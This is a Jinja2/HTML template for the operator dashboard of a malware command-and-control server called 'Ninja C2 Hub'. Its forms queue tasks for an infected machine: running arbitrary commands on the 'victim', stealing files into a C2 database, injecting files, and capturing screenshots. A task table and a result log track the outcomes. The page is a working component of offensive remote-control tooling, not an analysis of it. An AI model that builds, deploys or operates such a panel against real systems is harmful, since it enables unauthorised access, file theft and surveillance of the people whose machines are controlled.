{% extends 'base.html' %}

{% block title %} Ninja C2 Hub: Malware State {% endblock %}

{% block link %} <link rel="stylesheet" href="https://cdn.datatables.net/1.10.2/css/jquery.dataTables.min.css"> {% endblock %}

{% block script %} <script type="text/javascript" src="https://cdn.datatables.net/1.10.2/js/jquery.dataTables.min.js"></script> {% endblock %}

{% block style%} {% endblock %}

{% block content %}
<div class="container-fluid">

    <ul class="list-group">
		<li class="list-group-item">
			<h3> Malware Task Dashboard </h5>
			<br>
			<b> Malware ID : [ <span class="badge bg-danger"> {{ posts['name'] }} </span> ] : </b>
			{% if posts['connected'] %}
				<span class="badge bg-success"> Connected </span>
			{% else %}
				<span class="badge bg-warning"> Offline </span>
			{% endif %}
				last update time : {{ posts['updateT'] }}
		</li>

        <li class="list-group-item">
            <h5> Assign New Task to Malware </h5>

            <div class="form-check form-check-inline">
                <input type="radio" class="form-check-input" id="customRadio1" name="example" value="customEx"
                onchange="toggleDiv('customRadio1')">
                <label class="custom-control-label" for="customRadio1"> Run commands on victim </label>
            </div>
    
            <div class="form-check form-check-inline">
                <input type="radio" class="form-check-input" id="customRadio2" name="example" value="customEx"
                  onchange="toggleDiv('customRadio2')">
                <label class="custom-control-label" for="customRadio2"> Steal file from victim to C2-DB</label>
            </div>
    
            <div class="form-check form-check-inline">
                <input type="radio" class="form-check-input" id="customRadio3" name="example" value="customEx"
                  onchange="toggleDiv('customRadio3')">
                <label class="custom-control-label" for="customRadio3"> Inject file from C2-DB to victim </label>
            </div>

            <div class="form-check form-check-inline">
                <input type="radio" class="form-check-input" id="customRadio4" name="example" value="customEx"
                  onchange="toggleDiv('customRadio4')">
                <label class="custom-control-label" for="customRadio4"> Capture victim screenshot to C2-DB </label>
            </div>
            
			<p> </p>
            <div class="form-check form-check-inline">
                <input type="radio" class="form-check-input" id="customRadio10" name="example" value="customEx"
                  onchange="toggleDiv('customRadio10')">
                <label class="custom-control-label" for="customRadio10"> Assign a special task via Json </label>
              </div>

            <p> </p>

            <div id="content_1" style="display: none">
				<hr>
                <form action="/addcommand" method="POST" enctype="multipart/form-data">
					<button type="button" class="btn btn-secondary btn-sm">Malware Index:</button>
					<input name="malwareidx" value="{{posts['idx']}}" style="width: 3%;">
					<label> Input the command string : </label>
                	<input name="commandstr" style="width: 50%;">
                	<input type="submit">
                </form>
            </div>

            <div id="content_2" style="display: none">
				<hr>
                <form action="/addfilecopy" method="POST" enctype="multipart/form-data">
					<button type="button" class="btn btn-secondary btn-sm">Malware Index:</button>
					<input name="malwareidx" value="{{posts['idx']}}" style="width: 3%;">
                	<label> Input the target file path in victim: </label>
                	<input name="filepath" style="width: 50%;">
                	<input type="submit">
                </form>
            </div>

            <div id="content_3" style="display: none">
				<hr>
                <form action="/addfileinject" method="POST" enctype="multipart/form-data">
                    <button type="button" class="btn btn-secondary btn-sm">Malware Index:</button>
					<input name="malwareidx" value="{{posts['idx']}}" style="width: 3%;">
					<label> Select the inject file to victim:</label>
                    <select id="downloadfilename" name="downloadfilename">
                        {% for filename in files %}
                        <option value="{{filename}}"> {{ filename }} </option>
                        {% endfor %}
                    </select>
                    <input type="submit" value="Inject">
                </form>
            </div>

            <div id="content_4" style="display: none">
				<hr>
                <form action="/capturescreen" method="POST" enctype="multipart/form-data">
					<button type="button" class="btn btn-secondary btn-sm">Malware Index:</button>
					<input name="malwareidx" value="{{posts['idx']}}" style="width: 3%;">
                	<label> Capture victim screen shot and upload to C2, img file fomat: <b style="font-family: monospace;" > malwareID_Y_M_D_H_M_D.png <b> </label>
                	<input type="submit">
                </form>
            </div>

            <div id="content_10" style="display: none">
                <form action="/addspecialtask" method="POST" enctype="multipart/form-data">
                    <label for="contents"> Set task detail in below text field :</label>
                      Malware Idx: <input name="malwareidx" value="{{posts['idx']}}" style="width: 5%;">
                      taskType : <input name="tasktype" style="width: 10%;">
                      repeatTime : <input name="repeat" value="1" style="width: 5%;">
                      <p></p>
                      Task data :  <input name="taskdata" style="width: 70%;">
                    <input type="submit">
                </form>
              </div>
        </li>

        <li class="list-group-item">
            <h5> Current Task Information:</h5>
            <div class="table-responsive">
                <table class="table table-bordered table-dark">
                    <thead>
                        <tr class="table table-danger">
                            <th scope="col" class="col-1">Task ID</th>
                            <th scope="col" class="col-1">taskType</th>
                            <th scope="col" class="col-1">startTime</th>
                            <th scope="col" class="col-1">Task repeat</th>
                            <th scope="col" class="col-1">State</th>
                            <th>taskData</th>
                        </tr>
                    </thead>
    
                    <tbody>
                        {% for post in posts['tasks'] %}
                        <tr class="info">
                            <td> <b>{{ post['taskID'] }}</b> </td>
                            <td> {{ post['taskType'] }} </td>
                            <td>
                                <span class="badge bg-info"> {{ post['startT'] }} </span>
                            </td>
                            <td> {{ post['repeat'] }} </td>
                            <td>
                                {% if post['state'] == 0 %}
                                <span class="badge bg-info"> pending </span>
                                {% elif post['state'] == 1 %}
                                <span class="badge bg-success"> finished </span>
                                {% elif post['state'] == 2 %}
                                <span class="badge bg-warning"> accepted </span>
                                {% else %}
                                <span class="badge bg-danger"> error </span>
                                {% endif %}
                            </td>
                            <td> {{ post['taskData'] }} </td>
                        </tr>
                        {% endfor %}
                    </tbody>
                </table>
    
            </div>
    
        </li>

        <li class="list-group-item">
            <h5>Last Report Log </h5>
            <div class="alert alert-secondary">
                <strong>Task ID :  {{ posts['result']['taskID']}} </strong> 
                {% if posts['result']['state'] == 1 %}
                  <span class="badge bg-success"> finished </span>
                {% else %}
                  <span class="badge bg-danger"> error </span>
                {% endif %}
                Time : 
                <span class="badge bg-info"> {{ posts['result']['time'] }} </span>

                <button type="button" class="btn btn-primary btn-sm" data-bs-toggle="collapse" data-bs-target="#resultdetail">Show task result</button>
            </div>
            <div id="resultdetail" class="collapse">
				<textarea class="form-control" style="font-family: monospace;" rows="10" id="resultContents" name="resultContents", value="">{{ posts['result']['taskData']}}</textarea>
            </div>
        
        </li>
    </ul>
</div>

<script>

    function toggleDiv(radioName) {
      document.getElementById("content_1").style.display = "none";
      document.getElementById("content_2").style.display = "none";
      document.getElementById("content_3").style.display = "none";
      document.getElementById("content_4").style.display = "none";
      document.getElementById("content_10").style.display = "none";
      if (radioName === "customRadio1") {
        document.getElementById("content_1").style.display = "block";
      } else if (radioName === "customRadio2") {
        document.getElementById("content_2").style.display = "block";
      } else if (radioName === "customRadio3") {
        document.getElementById("content_3").style.display = "block";
      }else if (radioName === "customRadio4") {
        document.getElementById("content_4").style.display = "block";
      }else if (radioName === "customRadio10") {
        document.getElementById("content_10").style.display = "block";
      }
    }

    $(document).ready(function () {
        $('[data-toggle="tooltip"]').tooltip();

        var socket = io();
        var malwareID = "{{posts['name']}}";
        // Event handler for new connections.
        // The callback function is invoked when a connection with the
        // server is established.
        socket.on('connect', function () {
          socket.emit('cli_request', { data: 'peerstate SIO client connected!' });
        });
        socket.on('pagerefersh', function (msg) {
          if (msg.data == 'peerstate') {
            console.log("1:"+malwareID);
            console.log("2:"+msg.malwareID);
              //location.reload();
            if(msg.malwareID == malwareID) {
              location.reload();
            }
          }
        });
    });

    $(document).on("click", ".open-AddBookDialog", function () {
        var cardId = $(this).data('id');
        //var servername = $(this).data('server');
        //const element = document.getElementById("gpuName");
        //element.innerHTML = servername;
        $(".modal-body #gpuIndex").val( cardId );
        $(".modal-body #bookId").val( cardId );
    });

    $(document).ready(function(){
        $('[data-toggle="popover"]').popover(
            { trigger: 'focus'}
        );   
    });
    
</script>

{% endblock %}